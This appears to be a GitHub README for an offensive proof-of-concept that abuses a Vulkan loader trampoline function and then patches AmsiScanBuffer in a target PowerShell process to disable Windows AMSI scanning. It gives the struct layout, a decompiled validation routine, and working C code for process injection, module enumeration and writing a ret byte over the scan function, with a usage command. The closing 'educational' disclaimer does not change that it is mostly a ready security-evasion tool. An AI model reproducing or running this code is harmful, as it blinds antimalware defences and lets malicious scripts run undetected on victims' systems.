# VK* API AMSI Bypass - The Vulkan Trampoline Hack

> *"When they patch one door, we find another..."*

**VK* API AMSI Bypass** exploits Vulkan graphics driver validation logic to execute arbitrary code and bypass Windows AMSI scanning. This technique uses the `vulkan-1.dll` trampoline functions as a proxy for code execution, making it undetectable by traditional API hooking detection methods.

## 🔬 The Technical Deep Dive

### The Core Concept: Vulkan Trampoline Exploitation

The Vulkan loader (`vulkan-1.dll`) has internal trampoline functions that perform **checksum validation** before executing callbacks. These functions are designed to validate Vulkan device objects, but we've turned them into our personal code execution engine.

### The Magic Struct: `EG_STR`

```c
typedef struct {
    uint64_t p, m, _1, _2, _3, _4, _5, _6, _7;
} EG_STR;
```

This innocent-looking struct is actually our **Proxy**:

- **`p`** → Points to `m` (the checksum location)
- **`m`** → Contains `0x10ADED040410ADED` (the magic checksum)
- **`_7`** → Our callback function pointer at offset 56 (0x38)

### The Vulkan Validation Logic

When `vkAllocateMemory()` is called, it performs this validation:

```assembly
mov rax, [rcx]        ; Get first struct member
mov r10, MAGIC         ; Load magic checksum
cmp [rax], r10         ; Compare [rax] with magic
jz valid_device       ; If equal, continue
call abort            ; Otherwise, crash and burn
```

**The trick**: `[rax]` means "dereference the address stored in rax". Since `p` points to `m`, and `m` contains the magic value, the check passes!

### Decompiled vkAllocateMemory Function

Here's the decompiled version of the `vkAllocateMemory_0` function that shows the exact validation logic:

```c
__int64 __fastcall vkAllocateMemory_0(__int64 *a1)
{
  __int64 v1; // rax

  if ( !a1 || (v1 = *a1) == 0 || *(_QWORD *)v1 != 0x10ADED040410ADEDLL )
  {
    sub_1800031B0(0, 392, 0, "vkAllocateMemory: Invalid device [VUID-vkAllocateMemory-device-parameter]");
    j_abort();
  }
  return (*(__int64 (**)(void))(v1 + 56))();
}
```

This decompiled code reveals:
- **Parameter validation**: Checks if `a1` is valid and dereferences it to get `v1`
- **Magic checksum check**: Compares `*(_QWORD *)v1` with `0x10ADED040410ADEDLL`
- **Callback execution**: Returns the result of calling the function pointer at `v1 + 56` (offset 56)
- **Error handling**: Calls `abort()` with a validation error message if checks fail

### The Callback Execution

After validation, the function does:

```assembly
mov rax, [rax + 0x38]  ; Get callback at offset 56
jmp rax                 ; Jump to our function
```

**Offset 56** = `7 * sizeof(uint64_t)` = `_7` member = our callback!

## 🎯 The AMSI Patching Process

### 1. Process Injection Setup
```c
target = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
```
We get a handle to the target process (the one running PowerShell with AMSI enabled).

### 2. AMSI Function Location
```c
HMODULE amsi = LoadLibraryW(L"amsi.dll");
PFN_AmsiScanBuffer scan = (PFN_AmsiScanBuffer)GetProcAddress(amsi, "AmsiScanBuffer");
uintptr_t offset = (uintptr_t)scan - (uintptr_t)amsi;
```
We calculate the **RVA (Relative Virtual Address)** of `AmsiScanBuffer` from the base of `amsi.dll`.

### 3. Target Process AMSI Discovery
```c
EnumProcessModules(target, mods, sizeof(mods), &cb);
for (size_t i = 0; i < (cb / sizeof(HMODULE)); i++) {
    GetModuleBaseNameW(target, mods[i], name, sizeof(name) / sizeof(wchar_t));
    if (_wcsicmp(name, L"amsi.dll") == 0) { tgt = mods[i]; break; }
}
```
We enumerate all loaded modules in the target process to find where `amsi.dll` is loaded.

### 4. The Patch
```c
uintptr_t addr = (uintptr_t)tgt + offset;
VirtualProtectEx(target, (LPVOID)addr, 1, PAGE_EXECUTE_READWRITE, &old);
unsigned char ret = 0xC3;
WriteProcessMemory(target, (LPVOID)addr, &ret, 1, NULL);
VirtualProtectEx(target, (LPVOID)addr, 1, old, &old);
```

**The payload**: `0xC3` = `ret` instruction
- **What it does**: Makes `AmsiScanBuffer` return immediately
- **Result**: AMSI scanning is completely bypassed
- **Why it works**: The function never reaches the actual scanning code, issue, 0xc3 is detected on newer builds, i recommend doing other patch, i left 0xc3(Ret) beacuse this is PoC

## 🎮 Usage

```bash
Vk-Amsi-Bypass.exe <PID>
```

---
## Pics:
<img width="849" height="392" alt="image" src="https://github.com/user-attachments/assets/f9f41647-35b2-4fd8-b944-547f9f634123" />
<img width="1095" height="211" alt="image" src="https://github.com/user-attachments/assets/1596977f-f570-42bb-b43e-c206019cafd6" />


*"In the game of cat and mouse, sometimes the mouse uses the cat's own rules against it."* 🐭🐱

**Disclaimer**: This is for educational purposes only. Use responsibly and ethically.

### Credits:
- https://github.com/whokilleddb/function-collections/tree/main/hijack_callbacks/vkAllocateMemory
- https://github.com/carved4/vulkan-proxy
